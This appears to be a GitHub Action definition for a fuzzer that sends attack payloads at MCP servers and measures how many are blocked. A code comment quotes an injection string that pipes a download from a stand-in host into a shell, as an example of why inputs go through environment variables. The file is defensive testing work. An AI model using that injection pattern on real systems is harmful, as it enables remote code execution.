name: MCP Protocol Fuzzer
description: Fuzz tests any MCP server against 15 protocol-level attack payloads
inputs:
  target_url:
    description: MCP server URL to fuzz (e.g., http://localhost:4000/mcp)
    required: true
  min_block_rate:
    description: Minimum block rate percentage to pass (default 80)
    default: '80'
  timeout_seconds:
    description: Timeout per fuzz request (default 10)
    default: '10'
  fail_on_bypass:
    description: Fail the action if any critical payload bypasses detection
    default: 'true'
  control_tool:
    description: A harmless tool on the target that must run, proving the gateway isn't blocking everything (optional)
    default: ''

outputs:
  total_tests:
    description: Total number of fuzz payloads sent
    value: ${{ steps.fuzz.outputs.total }}
  blocked_count:
    description: Number of payloads blocked
    value: ${{ steps.fuzz.outputs.blocked }}
  passed_count:
    description: Number of payloads that passed (bypasses)
    value: ${{ steps.fuzz.outputs.passed }}
  block_rate:
    description: Block rate percentage
    value: ${{ steps.fuzz.outputs.block_rate }}
  report:
    description: JSON fuzz report
    value: ${{ steps.fuzz.outputs.report }}

runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Install dependencies
      shell: bash
      run: |
        cd $GITHUB_ACTION_PATH
        npm init -y --silent 2>/dev/null || true

    - name: Run MCP protocol fuzzer
      id: fuzz
      shell: bash
      # Inputs go through the environment, never into the script text: a value such as
      # `"; curl evil | sh; "` (e.g. a workflow_dispatch target_url) can't become a command.
      env:
        FUZZ_TARGET: ${{ inputs.target_url }}
        FUZZ_MIN_BLOCK_RATE: ${{ inputs.min_block_rate }}
        FUZZ_TIMEOUT: ${{ inputs.timeout_seconds }}
        FUZZ_FAIL_ON_BYPASS: ${{ inputs.fail_on_bypass }}
        FUZZ_CONTROL_TOOL: ${{ inputs.control_tool }}
      run: |
        node "$GITHUB_ACTION_PATH/fuzz.mjs" \
          --target "$FUZZ_TARGET" \
          --min-block-rate "$FUZZ_MIN_BLOCK_RATE" \
          --timeout "$FUZZ_TIMEOUT" \
          --fail-on-bypass "$FUZZ_FAIL_ON_BYPASS" \
          --control-tool "$FUZZ_CONTROL_TOOL"

branding:
  icon: shield
  color: red
